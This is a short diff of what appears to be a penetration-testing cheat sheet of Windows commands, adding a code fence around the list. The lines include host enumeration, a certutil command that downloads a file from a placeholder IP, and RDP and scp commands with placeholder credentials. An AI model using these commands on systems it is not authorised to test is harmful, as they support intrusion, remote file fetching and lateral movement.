@@ -1,4 +1,5 @@
 [full list](https://ss64.com/nt/)  
+```
 Hostname  
 systeminfo  
 Whoami  
@@ -16,3 +17,4 @@ certutil.exe -rulcache -f [http://ip/file.txt](http://ip/file.txt) file.txt
 xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:USERNAME /p:'PASSWORD'
  
 Scp <host>@<domain>:C:/file .
+```
